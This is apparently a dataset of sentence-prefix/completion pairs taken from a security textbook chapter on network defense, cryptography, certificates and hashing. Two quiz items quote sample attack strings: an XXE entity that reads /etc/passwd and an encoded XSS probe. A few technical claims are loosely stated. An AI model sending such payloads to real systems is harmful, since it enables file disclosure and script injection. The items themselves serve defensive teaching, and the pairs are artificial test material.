"in some cases , windows systems may allow windows remote","in some cases , windows systems may allow windows remote management ( winrm ) to perform administrative functions on other systems"
"this assumes you have credentials on the remote system , which may be","this assumes you have credentials on the remote system , which may be as simple as using domain credentials if you are on a domain controller"
"if you are further out , of course , you may still be","if you are further out , of course , you may still be able to use domain credentials if you have managed to gain access to them"
"if the winrm service is run-ning , you may also","if the winrm service is run-ning , you may also be able to run powershell commands to perform administrative tasks"
"on the windows side , powershell is available , and each","on the windows side , powershell is available , and each successive release of powershell has introduced a lot of new capabilities"
attackers have realized this and are starting to,attackers have realized this and are starting to use powershell to run attacks against the local network
"defense in depth/defense in breadth for a long time , defense in","defense in depth/defense in breadth for a long time , defense in depth was considered the way to best protect a network and its resources"
the point of a defense in depth strategy is primarily to delay an,the point of a defense in depth strategy is primarily to delay an attacker to give time for the defenders to rise and boot the attacker out
a very simple network design with the multiple tiers of con,a very simple network design with the multiple tiers of con - trols to protect from attack is shown in figure 12
there are multiple firewalls in place that provide the,there are multiple firewalls in place that provide the means to have stricter control of access between network segments
"this means that even if an attacker were to get through one line of defense , the","this means that even if an attacker were to get through one line of defense , the next line of defense would be slightly different and the attacker would have to start over again"
"on top of the firewall , there are access control lists that could be","on top of the firewall , there are access control lists that could be implemented on routers that sepa- rate network segments where there aren ’ t firewalls"
this includes all of the private addresses defined in,this includes all of the private addresses defined in rfc 1918 as well as any other reserved address space
the first is that it doesn ’ t factor in how the enterprise,the first is that it doesn ’ t factor in how the enterprise would know an attack was happening in order to rise to the defense
"if an attacker manages to get around the defenses in place and shows up in the midst of the network , how does","if an attacker manages to get around the defenses in place and shows up in the midst of the network , how does the operations team know so they can respond ? this raises the second point that is problematic in a defense in depth approach"
another potential problem with defense in depth is the number of devices in the net- work,"another potential problem with defense in depth is the number of devices in the net- work , where defensive functions are potentially siloed and where they may not work very well together"
"a defense in depth approach may be such that hosts have their own firewalls , managed","a defense in depth approach may be such that hosts have their own firewalls , managed by the server teams , while there may be multiple network teams managing their own protections"
you end up with the possibility of conflicting controls,you end up with the possibility of conflicting controls and certainly not a unified approach to securing the enterprise
"this approach factors in a broader range of attack types , with","this approach factors in a broader range of attack types , with the understanding that it ’ s not just network or transport layer attacks"
attacks are far more likely to happen at the application layer than they are lower,"attacks are far more likely to happen at the application layer than they are lower in the stack , where traditional firewalls are more apt to be successful in pro-tecting"
there are next-generation firewalls that cover more of,there are next-generation firewalls that cover more of the network stack than the more traditional stateful firewalls
this may include protecting against application layer attacks by understanding application,this may include protecting against application layer attacks by understanding application layer protocols in order to drop messages that violate those protocols
a defense in breadth strategy should factor in the overall needs of the enterprise without,"a defense in breadth strategy should factor in the overall needs of the enterprise without thinking that adding more layers of firewalls increases the hurdles , which may deter the attackers"
it ’ s best to approach defense of the enterprise with that,it ’ s best to approach defense of the enterprise with that understanding—a recognition that attackers will not be deterred by a few more hurdles
one way of addressing defense in depth and defense in breadth,one way of addressing defense in depth and defense in breadth is to introduce a uni- fied threat management ( utm ) device
this is a device that may be used on the edge of,"this is a device that may be used on the edge of a network and includes a firewall , intrusion detection , and anti-malware capabilities"
this is a next-generation device that recognizes the broad range,this is a next-generation device that recognizes the broad range of attacks that are happening and the vectors that are used
"when the expectation is that all businesses will be breached at some point , it ’ s","when the expectation is that all businesses will be breached at some point , it ’ s best to create an environment where these breaches can be detected so they can be responded to"
this is what is meant by a defensible network architecture—putting in place controls that will,"this is what is meant by a defensible network architecture—putting in place controls that will allow operations teams to have visibility into the environment , giving them the ability to respond"
the attack life cycle or cyber kill chain,the attack life cycle or cyber kill chain can provide guidance for the development of this architecture
"at every layer of the environment , there should be","at every layer of the environment , there should be visibility and tools in place to respond to any anomaly"
"this includes developing run books or playbooks for operations teams to follow , so that every response","this includes developing run books or playbooks for operations teams to follow , so that every response to an event is repeatable and based on an under-standing of essential assets and risk to the business"
an inci-dent is usually defined by an organization based on its own,"an inci-dent is usually defined by an organization based on its own requirements , but generally it ’ s an event that violates a policy"
"network devices can generate netflow data , which can be used","network devices can generate netflow data , which can be used to store summary information about connections into and out of the network"
"after an event has happened , having the data nec-essary to determine whether the","after an event has happened , having the data nec-essary to determine whether the event rises to the point of an incident and requires inves-tigation will be very helpful"
"without data like netflow to know what systems are talking and who they have been talking to ,","without data like netflow to know what systems are talking and who they have been talking to , it will be harder to scope the event and know what systems beyond the initial indicator may be impacted"
", web servers , proxy servers , active directory",", web servers , proxy servers , active directory servers , fi rewalls , intrusion detection sys-tems , etc"
"this might be something like elastic stack or splunk , or it","this might be something like elastic stack or splunk , or it may be a full-blown security information and event manage-ment ( siem ) solution"
once an attacker has been identi- fi ed in the,"once an attacker has been identi- fi ed in the environment , there needs to be the ability to respond"
you may need to continue to allow the attacker access to your,you may need to continue to allow the attacker access to your systems while you try to understand the extent of their infi ltration
"at the moment , we can ’ t ensure that adversar-ies won ’ t","at the moment , we can ’ t ensure that adversar-ies won ’ t get into the environment , especially as the predominant attack strategy is social engineering"
"this usually puts the attacker on the inside of the network , and that","this usually puts the attacker on the inside of the network , and that means the attacker will have access to everything a desktop user has access to"
a defensible network architecture should be able to allow the,a defensible network architecture should be able to allow the operations team to protect against anywhere adversaries are found to be
"attacks often happen at the application layer , and since web applications are such a common","attacks often happen at the application layer , and since web applications are such a common avenue for users to interact with businesses , web applications are a good target for attackers"
xml external entity processing can allow the use of xml to,"xml external entity processing can allow the use of xml to gain access to underlying system functions and files , for instance"
sql injection attacks can not only allow attackers access to the data stored in the database,"sql injection attacks can not only allow attackers access to the data stored in the database , they can also be used to gain access to the underlying operating system in some cases"
this may include not only data on the user ’ s system,"this may include not only data on the user ’ s system , but also data stored on sites the user has access to"
"session identification information , stored in cookies , may be used","session identification information , stored in cookies , may be used to gain access to other systems where the user has privileges"
"first , all input should be validated by each function ,","first , all input should be validated by each function , even if the expectation is it comes from a trusted source"
"when it comes to application-layer exploitation , attackers are looking to","when it comes to application-layer exploitation , attackers are looking to inject their own code into the memory space belonging to the application"
the point is to control the flow of the application by manipulating the,"the point is to control the flow of the application by manipulating the instruction pointer , telling the processor where to get its instructions to execute"
buffer overflows can be used to push instructions and return addresses,"buffer overflows can be used to push instructions and return addresses onto the stack , where data for the application is stored"
"if an attacker can push instructions onto the stack , the program","if an attacker can push instructions onto the stack , the program can be manipulated into executing those instructions , sometimes called arbitrary code execution"
this may involve privilege escalation and more reconnaissance so they,this may involve privilege escalation and more reconnaissance so they can gain access to systems where there may be more data
"this is sometimes called a castle defense , focused around building a lot of","this is sometimes called a castle defense , focused around building a lot of walls to make it more difficult or cumbersome for attackers to gain access to networks"
"this ignores modern adversaries , who are organized and well funded and will","this ignores modern adversaries , who are organized and well funded and will take as much time as necessary to gain access to a prized target"
"a few additional hurdles won ’ t be a deterrent , and if there are not detection strategies and controls","a few additional hurdles won ’ t be a deterrent , and if there are not detection strategies and controls in place , slowing the attacker down won ’ t provide much other than a short reprieve from the breach"
defense in breadth is a way to alleviate some of the concerns related,defense in breadth is a way to alleviate some of the concerns related to defense in depth by broadening the scope of understanding how modern attackers function
"a defense in breadth approach would look at the entire network stack , providing controls","a defense in breadth approach would look at the entire network stack , providing controls where possible to protect against attack rather than assuming more firewalls will keep attackers out"
it ’ s called defensible network architecture and it is,it ’ s called defensible network architecture and it is based on the understanding that social engineering attacks are common
it also takes into account the importance of visibility and response,"it also takes into account the importance of visibility and response , since breaches are common and may not be possible to avoid"
"logging is essential to detec-tion , and when a lot of logs are collected","logging is essential to detec-tion , and when a lot of logs are collected , a system to manage them is essential , such as a siem system"
what would be the result of sending the string aaaaaaaaaaaaaaaaa into,what would be the result of sending the string aaaaaaaaaaaaaaaaa into a variable that has been allocated space for 8 bytes ? a
"if you were to see the following in a packet capture , what would you think","if you were to see the following in a packet capture , what would you think was happening ? < ! entity xxe system `` file : ///etc/passwd '' > ] > a"
"if you were to see the following in a packet capture , what attack would you expect","if you were to see the following in a packet capture , what attack would you expect is happening ? % 3cscript % 3ealert ( 'wubble ' ) ; % 3c/script % 3e a"
it ’ s unusual for websites to be passing any,"it ’ s unusual for websites to be passing any traffic in the clear , even traffic that is brochure-ware"
"in fact , transport layer security ( tls ) is so well known with so many implementations that","in fact , transport layer security ( tls ) is so well known with so many implementations that it ’ s easy to add it as a means to encrypt communications between systems using many protocols"
"there are many means of encrypting messages , and the idea of encrypting","there are many means of encrypting messages , and the idea of encrypting messages , or hiding the writing in messages , has been around for millennia"
"probably almost as long as humans have been writing , there have","probably almost as long as humans have been writing , there have been means to make it difficult for others to read what is written"
"early forms of encrypted writing go back at least to the time of julius caesar , who developed his","early forms of encrypted writing go back at least to the time of julius caesar , who developed his own means of converting a message from its original form into a form that enemies couldn ’ t read"
encryption principles give way to implementations of,"encryption principles give way to implementations of cryptography , like those that use asymmetric keys"
"there is also symmetric key encryption , which means","there is also symmetric key encryption , which means there is a single key for both encryption and decryption"
"this may be handled through the use of a certificate authority ,","this may be handled through the use of a certificate authority , which issues encryption keys after , ideally , performing verification of identity"
"there is also a decentralized approach , but in the","there is also a decentralized approach , but in the end this is really about key management and identity verification"
"you want to know not only that the data being sent was protected ,","you want to know not only that the data being sent was protected , but also that it came from the person you expected it to come from"
"encryption is about privacy , but it ’ s important","encryption is about privacy , but it ’ s important to realize that encryption is not the solution to every problem"
what whole disk encryp - tion protects is a dead hard,what whole disk encryp - tion protects is a dead hard drive ( meaning it isn ’ t in a powered-up system )
"if an attacker can gain access to a system either through malware or stolen credentials , and the malware is run - ning in the","if an attacker can gain access to a system either through malware or stolen credentials , and the malware is run - ning in the context of a legitimate user with permissions or the stolen credentials have permissions on the system , the disk may as well not be encrypted"
once this plain text has gone through the transformation,"once this plain text has gone through the transformation process from a cryptographic algorithm , it is called ciphertext"
the goal is simply to generate something that someone who intercepted the,the goal is simply to generate something that someone who intercepted the message wouldn ’ t be able to read without some additional information
when you place the original alphabet over the top of the,"when you place the original alphabet over the top of the rotated alphabet , you can easily convert from one to the other"
"this is called a substitution cipher , because one letter is","this is called a substitution cipher , because one letter is simply substituted for another in a fi xed , known way"
"here is an example of what this would look like : rotation cipher abcdefghijklmnopqrstuvwxyz efghijklmnopqrstuvwxyzabcd to encrypt a word like hello ,","here is an example of what this would look like : rotation cipher abcdefghijklmnopqrstuvwxyz efghijklmnopqrstuvwxyzabcd to encrypt a word like hello , you would fi nd each letter in your word in the top row and fi nd its substitute in the bottom row"
"in order to decrypt , you fi nd each letter in the bottom row and","in order to decrypt , you fi nd each letter in the bottom row and replace it with the correspond- ing letter in the same position in the top row"
it is said that this technique of encrypting messages was developed by julius caesar,"it is said that this technique of encrypting messages was developed by julius caesar , who used they to send messages to his generals in the fi eld"
users of the former newsgroup network usenet commonly used a rotation cipher to,users of the former newsgroup network usenet commonly used a rotation cipher to obscure anything in a message that may be considered offensive or a spoiler
"this meant that in order to read it , someone would have to deliberately decrypt","this meant that in order to read it , someone would have to deliberately decrypt that portion of the message and couldn ’ t complain that it was in the clear"
"the common rotation was referred to as rot13 , meaning","the common rotation was referred to as rot13 , meaning the text was rotated halfway around the alphabet , 13 positions"
"this sort of cipher can have the key revealed through a brute force attack , meaning every rotation possibility is tried ( in the latin alphabet","this sort of cipher can have the key revealed through a brute force attack , meaning every rotation possibility is tried ( in the latin alphabet that we use , there are 25 possibilities , since 26 would just rotate back to where you started and not be any rotation at all )"
"eventually , a message resulting from these attempts would make","eventually , a message resulting from these attempts would make sense , at which point you would know the key"
a frequency analysis on a substitution cipher like the rotation cipher finds the most,a frequency analysis on a substitution cipher like the rotation cipher finds the most used letters in the ciphertext and applies statistical probability based on a normal distribution
"once you start substituting the most commonly used letters , some of the words will start to make sense , so in cases where letters","once you start substituting the most commonly used letters , some of the words will start to make sense , so in cases where letters have the same distribution probability , you may be able to identify letters based on the words that are clear in the partially decoded ciphertext"
"of course , with a rotation cipher , once you have one letter decoded , you will","of course , with a rotation cipher , once you have one letter decoded , you will have the key because you know how far away the ciphertext letter is from the plain-text letter"
"14 because the rotation cipher is easily decrypted , especially if it ’ s known","14 because the rotation cipher is easily decrypted , especially if it ’ s known to be a rotation cipher , there are other methods of dealing with encryption by hand"
you can see an example of the grid or square you,you can see an example of the grid or square you would use to encrypt messages using the vigenère cipher in figure 13
the key letter is matched on the top row with,the key letter is matched on the top row with the letter from the plain text matched along the left-hand column
2 vigenère square another way to think about this is to align,2 vigenère square another way to think about this is to align the key along the x-axis while the plain text is along the y-axis
"for the second letter , you look up e along the y-axis and e","for the second letter , you look up e along the y-axis and e along the x-axis and find where the row and column intersect and find i"
there are programs available and websites that will encrypt and decrypt this sort,"there are programs available and websites that will encrypt and decrypt this sort of cipher for you , just as there are for the rotation cipher"
"this does mean , though , that while very clever and challenging to decipher manually when they were","this does mean , though , that while very clever and challenging to decipher manually when they were developed , both these substitution ciphers are unusable today because modern computing has made them trivial to crack"
"as a result , we need to look at other","as a result , we need to look at other methods of encryption , including and perhaps especially transformation ciphers"
"if the keys are not shared ahead of time , there needs to be a way","if the keys are not shared ahead of time , there needs to be a way for two parties in an encrypted communication to share keys without anyone being able to intercept them"
whitfield diffie and martin hellman came up with an approach that would allow two endpoints to,whitfield diffie and martin hellman came up with an approach that would allow two endpoints to generate a key without ever transmitting any data that would allow the key to be known
while the details of it involve a lot of math that we won ’,"while the details of it involve a lot of math that we won ’ t go into here , it ’ s easy enough in the abstract to understand"
3 shows how keys are generated with diffie-hellman,"3 shows how keys are generated with diffie-hellman , using paints to demonstrate how the process works"
this assumes that separating the colors out to the two colors (,this assumes that separating the colors out to the two colors ( values ) that created the transmitted color is a very expensive process
"once both sides have the value/color from the other side , all they need","once both sides have the value/color from the other side , all they need to do is add in the random value they added to the base color"
3 shows that adding the random colors in after,3 shows that adding the random colors in after the transmission results in a common secret/color that is brown
"using this process , you can create a key that","using this process , you can create a key that can be used to encrypt and decrypt messages from both parties"
this is a fairly common approach to keys because there is a single key that,this is a fairly common approach to keys because there is a single key that needs to be managed and it doesn ’ t matter which direction the transmission is going
"if they don ’ t , the message that was encrypted by one","if they don ’ t , the message that was encrypted by one key won ’ t be decrypted by another key and will look like gibberish"
if the total length of the data isn ’ t a multiple of the block,"if the total length of the data isn ’ t a multiple of the block size , the last block is padded to get to the size of the block"
a block cipher may com - monly use a block,"a block cipher may com - monly use a block length of 64 bits , which would be eight single-byte characters"
data encryption standard ( des ) the data encryption standard (,data encryption standard ( des ) the data encryption standard ( des ) is a block cipher that uses a symmetric key
"this is a long-deprecated encryption standard ,","this is a long-deprecated encryption standard , but it raises an important element about cryptogra-phy"
"when it was approved in the 1970s , based on a cipher named lucifer from","when it was approved in the 1970s , based on a cipher named lucifer from ibm , computing power was not strong enough to take on a long key length"
"as com-puting power has increased , even without issues in the","as com-puting power has increased , even without issues in the algorithm itself , the key becomes vulnerable to brute force attacks"
this means someone trying to crack an encrypted mes-sage can try,this means someone trying to crack an encrypted mes-sage can try every possible key against the ciphertext in order to extract plain text
the problem is if you keep encrypting with the same key over and,"the problem is if you keep encrypting with the same key over and over , you can still attack the key if there are weaknesses there"
"with triple des ( 3des ) , there are three","with triple des ( 3des ) , there are three keys , which increases the effective key length to 168 bits"
"since you are decrypting with an entirely separate key ,","since you are decrypting with an entirely separate key , you still end up with ciphertext and not plain text"
"essentially , you take plain text to get ciphertext once , then take ciphertext , decrypt it","essentially , you take plain text to get ciphertext once , then take ciphertext , decrypt it into ciphertext , and take that result-ing ciphertext and encrypt it to obtain one more round of ciphertext"
"the reason for mentioning des and 3des , in spite of the fact","the reason for mentioning des and 3des , in spite of the fact that both are deprecated , is to suggest that key strength is important"
"since three 56-bit des keys is 168 bits , you might think you ’ re working","since three 56-bit des keys is 168 bits , you might think you ’ re working with a 168-bit key and any other symmetric algorithm using a shorter key would be worse"
"you could double the key length or even triple it , but","you could double the key length or even triple it , but the algorithm could still be broken to allow the message to be decrypted"
advanced encryption standard ( aes ) the replacement algorithm,advanced encryption standard ( aes ) the replacement algorithm for des was the advanced encryption standard ( aes )
just as lucifer was used to create the standard known as des,"just as lucifer was used to create the standard known as des , the rijndael cipher was used as the basis for the aes"
"the cipher is different from the standard , and while","the cipher is different from the standard , and while rijndael was developed earlier , the standard was published in 2001"
"just as des with a 56-bit key became vulnerable over time , aes","just as des with a 56-bit key became vulnerable over time , aes is starting to become potentially vulnerable to attack with a 128-bit key length"
one thing to be aware of is that an encryption cipher is only a,one thing to be aware of is that an encryption cipher is only a portion of what is neces- sary to allow for messages to be encrypted between endpoints
"in the following code listing , though , you can see a","in the following code listing , though , you can see a list of the ciphersuites that are allowed on google ’ s web server"
"this list was created with sslscan , a tool used to identify supported cryptographic","this list was created with sslscan , a tool used to identify supported cryptographic ciphers on servers that use the secure sockets layer ( ssl ) and tls protocols"
in spite of the fact that it ’ s been deprecated in favor of,"in spite of the fact that it ’ s been deprecated in favor of aes , there are still browsers that run on systems that may be less capable"
"since the first block in has no previous block , there is","since the first block in has no previous block , there is an initialization vector ( iv ) that is used to xor against"
"keep in mind that ciphertext is always binary , since","keep in mind that ciphertext is always binary , since each byte may not align with a printable ascii character"
this is not the sort of attack that someone would be,this is not the sort of attack that someone would be able to accomplish without extensive understanding of cryptography and how systems work
"this does not mean that aes is entirely invulnerable , but","this does not mean that aes is entirely invulnerable , but so far , there have been no weaknesses discovered in the algorithm"
these two keys are tied mathematically so that what is,these two keys are tied mathematically so that what is encrypted by one key can be decrypted by the other
"in fact , the public key is meant to be public , meaning the","in fact , the public key is meant to be public , meaning the only way public key cryptography works is if people actu-ally have the public key"
"the private key is the only key that needs to be protected in this scheme , which is","the private key is the only key that needs to be protected in this scheme , which is fine because it is only needed to decrypt messages that have been sent using the corresponding public key"
"if you want to exchange encrypted messages with someone , you should","if you want to exchange encrypted messages with someone , you should provide them with your public key and they should provide you with theirs"
one common algorithm that uses public key,one common algorithm that uses public key cryptography is the rivest-shamir-adleman ( rsa ) algorithm
this is another area that highlights why key strengths can,this is another area that highlights why key strengths can ’ t simply be compared from one algorithm to another
just because aes uses 128 bits and rsa uses 1024,just because aes uses 128 bits and rsa uses 1024 doesn ’ t mean rsa is an order of magnitude stronger
the only thing you can say about key sizes is that rsa with a 2048-bit key is considerably stronger than rsa,"the only thing you can say about key sizes is that rsa with a 2048-bit key is considerably stronger than rsa with a 1024-bit key , just as aes with a 256-bit key is considerably stronger than aes with a 128-bit key"
"why not just use one ? even though you can ’ t directly compare symmetric and asymmetric , asymmetric keys are considerably larger , and if an attack relies on brute force","why not just use one ? even though you can ’ t directly compare symmetric and asymmetric , asymmetric keys are considerably larger , and if an attack relies on brute force , it would take vastly longer to brute-force a 1024-bit key as compared with a 128-bit key , simply because there are many orders of magnitude more keys in the key space"
"so , why not just use asymmetric key cryptography everywhere ?","so , why not just use asymmetric key cryptography everywhere ? first , asymmetric key cryptography is expensive in terms of computing power"
"while this isn ’ t the problem that it once was because modern computers are so fast , we","while this isn ’ t the problem that it once was because modern computers are so fast , we are still having to use larger and larger keys , which can mean more computation because of the key length"
the public key can be used to protect the symmetric key so,the public key can be used to protect the symmetric key so there isn ’ t a problem with anyone obtaining this symmetric key
"the symmetric key in this case is sometimes called a session key ,","the symmetric key in this case is sometimes called a session key , because it is used to encrypt the data in a session between two systems"
"while diffie-hellman may be used to negotiate the key derivation ,","while diffie-hellman may be used to negotiate the key derivation , in practice it isn ’ t used in a hybrid cryptosystem"
this means the client would generate the session ( symmetric ) key and send it,"this means the client would generate the session ( symmetric ) key and send it to the web server , encrypting it with the web server ’ s public key"
non-repudiation another value of public key cryptography is that the public key and private,"non-repudiation another value of public key cryptography is that the public key and private key belong exclusively to a person or system , depending on its ultimate use"
this principle of demonstrating that a message originated from,this principle of demonstrating that a message originated from the owner of a private key is called non-repudiation
"in fairness , non-repudiation says that when a message has been sent using a private key ,","in fairness , non-repudiation says that when a message has been sent using a private key , the owner of that private key can ’ t say the message didn ’ t originate with them"
it ’ s just that the term non-repudiation means you can ’ t,it ’ s just that the term non-repudiation means you can ’ t go back on something by claiming it didn ’ t come from you
if a private key is not protected in any way and it,"if a private key is not protected in any way and it gets out into the open , it could be used by anyone"
the first is that the file containing the key should have appropriate,the first is that the file containing the key should have appropriate per - missions so only the owner of the file can access it
the password would be requested before the key could be used,the password would be requested before the key could be used to sign the message or else the message signing would fail
"elliptic curve cryptography while the factoring of prime numbers has commonly been used for keying , because the power and time","elliptic curve cryptography while the factoring of prime numbers has commonly been used for keying , because the power and time necessary to perform computations on these large numbers is extensive , using them is not the only way to generate keys"
"computers have continued to become significantly more powerful , and it ’ s far less","computers have continued to become significantly more powerful , and it ’ s far less difficult to apply many of them at a time to take on complex and difficult tasks"
rather than just using resource-intensive computations such as,"rather than just using resource-intensive computations such as prime number factorization , ecc uses discrete logarithms"
it is assumed that identifying the discrete logarithm of a,it is assumed that identifying the discrete logarithm of a random ellip-tic curve element is not just computationally difficult but infeasible
a logarithm is the inverse of exponentiation and a discrete logarithm is the,a logarithm is the inverse of exponentiation and a discrete logarithm is the value that you raise one number to in order to get another number
"there are some specific cases where they can be com- puted easily and quickly , but discrete logarithms are not a","there are some specific cases where they can be com- puted easily and quickly , but discrete logarithms are not a problem that has a generalized solution , so given discrete logarithm x , there is only one way to compute the solution"
"unlike factors of prime numbers , for which there are known computations , even if they are resource","unlike factors of prime numbers , for which there are known computations , even if they are resource intensive , ecc works because there is no way to reverse the process in order to find the answer"
perhaps an easier way to think about this is,perhaps an easier way to think about this is that there are a lot of multivariable poly- nomial equations
there is not a single algorithm that allows taking a point on the,there is not a single algorithm that allows taking a point on the curve generated by the equation and reversing it back to the original equation
without that gen-eralized algorithm that allows all equations to be solved ( or solved in reverse to be more accurate,"without that gen-eralized algorithm that allows all equations to be solved ( or solved in reverse to be more accurate ) , this is another intractable problem that allows for the creation of keys that can ’ t be determined easily"
keys that are used for sessions need to be protected but don ’,keys that are used for sessions need to be protected but don ’ t need to be stored beyond the sessions for which they are needed
"once the session is over , perhaps in a handful of minutes when","once the session is over , perhaps in a handful of minutes when a client is talking to a web server , the key is discarded"
"however , keys that have been created for a person and associated to that","however , keys that have been created for a person and associated to that person , even if the person is a server , need to be persistent"
"remember that the certificate includes the keying information , and when you are using","remember that the certificate includes the keying information , and when you are using public key cryptography , the point is to get your pub-lic key out there"
"it issues certificates to users , which means it collects information from","it issues certificates to users , which means it collects information from the user and then generates the key to provide to the user"
this software uses the openssl library and utilities to generate the certificates,"this software uses the openssl library and utilities to generate the certificates and handles the storage , creation , and management through a graphical interface"
"5 shows creating a certificate authority , meaning creating the","5 shows creating a certificate authority , meaning creating the root certificate and the certificate repository , using simple authority"
5 simple authority ca creation once the root certificate,"5 simple authority ca creation once the root certificate has been generated , you can create other certificates"
6 shows not only the creation of a new certificate,6 shows not only the creation of a new certificate but also the different types of certificates that can be created
"any web server that uses encrypted messages , and these days it ’ s rare to","any web server that uses encrypted messages , and these days it ’ s rare to find a web server that isn ’ t encrypting traffic , needs to have a certificate"
"if you were going to set up a web server that was going to use tls ,","if you were going to set up a web server that was going to use tls , you would select ssl server , since tls is the current implementation of what was once ssl"
"the ca can pro-vide the public key to anyone who wants it ,","the ca can pro-vide the public key to anyone who wants it , but the user who owns the certificate needs to have the private key portion"
what you will see there are the details provided during,what you will see there are the details provided during the certificate creation as well as information about the key
"this is just a set of bits that would not be printable , since each byte","this is just a set of bits that would not be printable , since each byte is not limited to the set of values that are considered printable in the ascii table"
"7 certificate details instead of the key itself , which wouldn ’","7 certificate details instead of the key itself , which wouldn ’ t mean much , you can see a fingerprint of the key"
"you could , of course , also show the key in","you could , of course , also show the key in hexadecimal rather than trying to generate characters from the byte values"
just to give you a sense of how much that is,"just to give you a sense of how much that is , this paragraph is 561 characters , including spaces and punctuation"
this may be because a user is no longer associated,"this may be because a user is no longer associated with the organization that manages the authority , for instance"
"when a certificate has been revoked , any party validat-","when a certificate has been revoked , any party validat- ing the certificate against the authority should not accept the certificate"
the problem with crls historically has been that,the problem with crls historically has been that they are not always requested to validate a certificate
there may also not be a good way to provide the crl to a system validating,"there may also not be a good way to provide the crl to a system validating a certificate , depending on the network location of the ca relative to the validating system"
is one reachable from the other and are there firewalls that would preclude the communi-cation ? as a result,"is one reachable from the other and are there firewalls that would preclude the communi-cation ? as a result , the online certificate status protocol ( ocsp ) can be used to verify a certificate with a ca"
trusted third party an advantage to using a ca is that there is a central authority that,trusted third party an advantage to using a ca is that there is a central authority that is used to not only store certificates and manage them but also to perform verification of identity
"it could be spoofed , or it could be com-ing","it could be spoofed , or it could be com-ing from an attacker who has access to the correct email address"
this may come from checking some identifi-cation credential that,this may come from checking some identifi-cation credential that demonstrates that you are who you say you are
"in the case of a third-party provider like verisign , you may be","in the case of a third-party provider like verisign , you may be expected to securely provide a photo identification before they will issue your certificate"
"ideally , you want to always know that the person you are sending encrypted","ideally , you want to always know that the person you are sending encrypted messages to or receiving signed messages from is the person you expect them to be"
"the transitive property says , in this case , that if you trust the ca and the ca trusts that another","the transitive property says , in this case , that if you trust the ca and the ca trusts that another person is who they say they are , then you , too , believe that person is who they say they are"
we know which ca to trust because every certificate that is generated,we know which ca to trust because every certificate that is generated by a ca is signed by the ca ’ s root certificate
"if that ’ s true , you know the certificate","if that ’ s true , you know the certificate is authentic and the identity associ-ated with the certificate is valid"
"this means that for every ca you trust , you need to add that","this means that for every ca you trust , you need to add that ca ’ s root certificate to your certificate cache so the signatures match something"
this may be a result of a certificate being generated from an untrusted,"this may be a result of a certificate being generated from an untrusted authority , meaning you haven ’ t installed that authority ’ s root certificate"
8 certificate error google chrome has generated this error because the name,8 certificate error google chrome has generated this error because the name on the certificate doesn ’ t match the name of the server
"this demonstrates that even if a certificate comes from a trusted authority , that doesn ’ t mean the","this demonstrates that even if a certificate comes from a trusted authority , that doesn ’ t mean the server you are connecting to can be trusted because the certificate may have been taken and installed somewhere else"
"here , furniture row is the company that owns sofa mart , so it","here , furniture row is the company that owns sofa mart , so it attempted to save some money by using the same certificate across all servers it uses"
self-signed certificates sometimes you want to just encrypt messages,"self-signed certificates sometimes you want to just encrypt messages between two systems in a lab , for instance"
"just as openssl was used by simple authority , it can","just as openssl was used by simple authority , it can be used on the command line to generate certificates by hand"
pem'enter pem pass phrase : verifying - enter pem pass phrase : -- -- -you,pem'enter pem pass phrase : verifying - enter pem pass phrase : -- -- -you are about to be asked to enter information that will be incorporatedinto your certificate request
there are quite a few fields but you can leave some blankfor,"there are quite a few fields but you can leave some blankfor some fields there will be a default value , if you enter '"
"-- -- -country name ( 2 letter code ) [ au ] : usstate or province name ( full name ) [ some-state ] : colocality name ( eg , city )","-- -- -country name ( 2 letter code ) [ au ] : usstate or province name ( full name ) [ some-state ] : colocality name ( eg , city ) [ ] : wubbleorganization name ( eg , company ) [ internet widgits pty ltd ] : organizational unit name ( eg , section ) [ ] : itcommon name ( e"
you may have run across cases where the certificate is out,"you may have run across cases where the certificate is out of date , meaning an old certificate is still being used"
you don ’ t want to have to keep updating your root certificate every year because it would lead to,"you don ’ t want to have to keep updating your root certificate every year because it would lead to a lot of users who had outdated root certificates , meaning every certificate signed by that ca would be invalid"
pem -text certificate : data : version : 3 ( 0x2 ) serial number : 5a:50 : cd:8a : dc:2d:57 : ff:52:13 : ca:51 : a6 : f5:90:7e:71:28:50:9a signature algorithm,"pem -text certificate : data : version : 3 ( 0x2 ) serial number : 5a:50 : cd:8a : dc:2d:57 : ff:52:13 : ca:51 : a6 : f5:90:7e:71:28:50:9a signature algorithm : sha256withrsaencryption issuer : c = us , st = co , l = wubble , o = internet widgits pty ltd , ou = it , cn = www"
com validity not before : jan 20 22:13:54 2019 gmt not after : jan 20 22:13:54 2020 gmt subject : c = us,"com validity not before : jan 20 22:13:54 2019 gmt not after : jan 20 22:13:54 2020 gmt subject : c = us , st = co , l = wubble , o = internet widgits pty ltd , ou = it , cn = www"
com subject public key info : public key algorithm : rsaencryption rsa public-key : ( 4096 bit,com subject public key info : public key algorithm : rsaencryption rsa public-key : ( 4096 bit ) here you can see a lot of details about the certificate that weren ’ t provided
"it ’ s a self-signed certificate , so the same","it ’ s a self-signed certificate , so the same device it ’ s been generated for has effectively signed it"
"additionally , the full text output includes the modulus","additionally , the full text output includes the modulus , which is the product of two large prime numbers"
there is a lot of data that is stored in the certificate,"there is a lot of data that is stored in the certificate , and it takes a lot of space to print it all out"
"it does , though , give you a good sense of","it does , though , give you a good sense of what information is captured and is necessary to make certificates work"
cryptographic hashing there is an important element to,cryptographic hashing there is an important element to cryptography that we have been breezing by so far
"you may have seen it show up in places earlier in the chapter ,","you may have seen it show up in places earlier in the chapter , such as the self-signed certificate or even the ciphersuites used on a web server"
the mac here is a fi xed-length value that is,the mac here is a fi xed-length value that is generated by running the entire message through a cryptographic algorithm
md5 is a cryptographic algorithm that takes,md5 is a cryptographic algorithm that takes arbitrary-length input and generates a fi xed-length output
you can see this in the following code listing where i take the,you can see this in the following code listing where i take the string '123456789 ' and get an md hash from it using the md5sum command
"the second time around , i get a hash from the","the second time around , i get a hash from the string '223456789 ' , which is a change of a single bit"
generating an md5 hash root @ quiche : ~ # echo '123456789 ' | md5sum b2cfa4183267af678ea06c7407d4d6d8 - root @ quiche : ~ # echo,generating an md5 hash root @ quiche : ~ # echo '123456789 ' | md5sum b2cfa4183267af678ea06c7407d4d6d8 - root @ quiche : ~ # echo '223456789 ' | md5sum 2cad6f3fd5e54b84cfccd3e1ef5aea4d - one of the expectations of a cryptographic hash is that every set of input will yield a different value
"since these values are used to authenticate messages , if the message digest output could be manipulated through the use","since these values are used to authenticate messages , if the message digest output could be manipulated through the use of collisions , it could result in messages being altered while still allowing the message digest value to remain the same"
the problem of collisions in hash algorithms relates,the problem of collisions in hash algorithms relates to a mathemati- cal problem called the birthday paradox
